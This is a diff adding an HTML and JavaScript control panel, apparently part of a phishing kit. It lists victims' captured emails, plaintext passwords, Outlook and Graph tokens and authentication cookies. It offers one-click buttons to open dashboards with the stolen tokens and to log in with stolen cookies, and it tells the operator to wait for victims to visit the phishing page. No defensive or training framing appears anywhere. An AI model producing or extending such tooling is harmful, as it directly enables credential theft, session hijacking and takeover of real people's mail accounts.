@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Dashboard - Session Manager</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .header h1 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+            color: #667eea;
+        }
+        
+        .stat-label {
+            color: #666;
+            margin-top: 10px;
+        }
+        
+        .session-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        
+        .session-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+        
+        .session-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+        
+        .session-id {
+            font-family: monospace;
+            font-size: 14px;
+            color: #667eea;
+            font-weight: bold;
+        }
+        
+        .session-time {
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .session-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .detail-item {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        
+        .detail-label {
+            font-size: 11px;
+            color: #999;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+        
+        .detail-value {
+            font-size: 14px;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+        
+        .badge-success {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .badge-warning {
+            background: #ff9800;
+            color: white;
+        }
+        
+        .badge-info {
+            background: #2196f3;
+            color: white;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        
+        button:hover {
+            background: #5a67d8;
+            transform: translateY(-1px);
+        }
+        
+        button.outlook {
+            background: #0078d4;
+        }
+        
+        button.graph {
+            background: #00a4ef;
+        }
+        
+        button.cookie {
+            background: #ff9800;
+        }
+        
+        button.danger {
+            background: #f44336;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: white;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .refresh-btn {
+            background: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .session-details {
+                grid-template-columns: 1fr;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Phishing Session Manager</h1>
+            <p>Manage captured sessions, tokens, and cookies</p>
+            <button class="refresh-btn" onclick="loadSessions()">🔄 Refresh Sessions</button>
+        </div>
+        
+        <div class="stats" id="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalSessions">0</div>
+                <div class="stat-label">Total Sessions</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalTokens">0</div>
+                <div class="stat-label">With Tokens</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalCookies">0</div>
+                <div class="stat-label">Auth Cookies</div>
+            </div>
+        </div>
+        
+        <div id="sessionsContainer">
+            <div class="loading">
+                <div class="spinner"></div>
+                <p>Loading sessions...</p>
+            </div>
+        </div>
+    </div>
+    
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <h3 id="modalTitle">Loading Dashboard...</h3>
+            <div class="spinner"></div>
+            <p id="modalMessage">Please wait while we load your session</p>
+        </div>
+    </div>
+    
+    <script>
+        async function loadSessions() {
+            const container = document.getElementById('sessionsContainer');
+            container.innerHTML = '<div class="loading"><div class="spinner"></div><p>Loading sessions...</p></div>';
+            
+            try {
+                const response = await fetch('/api/sessions');
+                const sessions = await response.json();
+                
+                // Update stats
+                document.getElementById('totalSessions').textContent = sessions.length;
+                document.getElementById('totalTokens').textContent = sessions.filter(s => s.tokens).length;
+                const totalAuthCookies = sessions.reduce((sum, s) => sum + (s.cookies?.filter(c => c.is_auth_cookie)?.length || 0), 0);
+                document.getElementById('totalCookies').textContent = totalAuthCookies;
+                
+                if (sessions.length === 0) {
+                    container.innerHTML = '<div class="loading"><p>No sessions captured yet. Wait for victims to visit your phishing page.</p></div>';
+                    return;
+                }
+                
+                container.innerHTML = sessions.map(session => `
+                    <div class="session-card">
+                        <div class="session-header">
+                            <span class="session-id">📱 ${session.sessionId}</span>
+                            <span class="session-time">${new Date(session.capturedAt).toLocaleString()}</span>
+                        </div>
+                        <div class="session-details">
+                            <div class="detail-item">
+                                <div class="detail-label">Email</div>
+                                <div class="detail-value">${escapeHtml(session.email)}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Credentials</div>
+                                <div class="detail-value">
+                                    ${session.credentials ? `
+                                        <span class="badge badge-success">✓ Captured</span>
+                                        <br><small>${escapeHtml(session.credentials.username)}</small>
+                                    ` : '<span class="badge badge-warning">Not captured</span>'}
+                                </div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Tokens</div>
+                                <div class="detail-value">
+                                    ${session.tokens ? `
+                                        ${session.tokens.outlook ? '<span class="badge badge-success">Outlook</span>' : ''}
+                                        ${session.tokens.graph ? '<span class="badge badge-success">Graph</span>' : ''}
+                                    ` : '<span class="badge badge-warning">No tokens</span>'}
+                                </div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Auth Cookies</div>
+                                <div class="detail-value">
+                                    <span class="badge badge-info">${session.cookies?.filter(c => c.is_auth_cookie)?.length || 0}</span>
+                                    <br><small>Total: ${session.cookies?.length || 0} cookies</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="button-group">
+                            ${session.tokens?.outlook ? `
+                                <button class="outlook" onclick="loadDashboard('${session.sessionId}', 'outlook')">📧 Outlook Dashboard</button>
+                            ` : ''}
+                            ${session.tokens?.graph ? `
+                                <button class="graph" onclick="loadDashboard('${session.sessionId}', 'graph')">🔄 Graph Dashboard</button>
+                            ` : ''}
+                            ${session.cookies?.filter(c => c.is_auth_cookie)?.length > 0 ? `
+                                <button class="cookie" onclick="loginWithCookies('${session.sessionId}')">🍪 Login with Cookies</button>
+                            ` : ''}
+                            <button onclick="viewSessionDetails('${session.sessionId}')">📋 View Details</button>
+                        </div>
+                    </div>
+                `).join('');
+                
+            } catch (error) {
+                console.error('Error loading sessions:', error);
+                container.innerHTML = '<div class="loading"><p>Error loading sessions. Make sure the server is running.</p></div>';
+            }
+        }
+        
+        async function loadDashboard(sessionId, tokenType) {
+            const modal = document.getElementById('modal');
+            modal.style.display = 'flex';
+            
+            try {
+                const response = await fetch('/api/load-dashboard', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId, tokenType })
+                });
+                
+                if (response.ok) {
+                    const html = await response.text();
+                    document.write(html);
+                    document.close();
+                } else {
+                    throw new Error('Failed to load dashboard');
+                }
+            } catch (error) {
+                alert('Error loading dashboard: ' + error.message);
+                modal.style.display = 'none';
+            }
+        }
+        
+        async function loginWithCookies(sessionId) {
+            const modal = document.getElementById('modal');
+            modal.style.display = 'flex';
+            document.getElementById('modalTitle').textContent = 'Login with Cookies';
+            document.getElementById('modalMessage').textContent = 'Setting authentication cookies...';
+            
+            try {
+                const response = await fetch('/api/login-with-cookies', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId })
+                });
+                
+                if (response.ok) {
+                    const html = await response.text();
+                    document.write(html);
+                    document.close();
+                } else {
+                    throw new Error('Failed to login with cookies');
+                }
+            } catch (error) {
+                alert('Error logging in with cookies: ' + error.message);
+                modal.style.display = 'none';
+            }
+        }
+        
+        async function viewSessionDetails(sessionId) {
+            try {
+                const response = await fetch(`/api/session/${sessionId}`);
+                const session = await response.json();
+                
+                const details = `
+                    Session ID: ${session.sessionId}
+                    Email: ${session.email}
+                    Credentials: ${session.credentials ? `${session.credentials.username} / ${session.credentials.password}` : 'Not captured'}
+                    Tokens: ${session.tokens ? 'Captured' : 'Not captured'}
+                    Cookies: ${session.cookies.length} total, ${session.cookies.filter(c => c.is_auth_cookie).length} auth cookies
+                    Captured: ${new Date(session.capturedAt).toLocaleString()}
+                `;
+                
+                alert(details);
+            } catch (error) {
+                alert('Error loading session details: ' + error.message);
+            }
+        }
+        
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Auto-refresh every 10 seconds
+        setInterval(loadSessions, 10000);
+        
+        // Load sessions on page load
+        loadSessions();
+    </script>
+</body>
+</html>
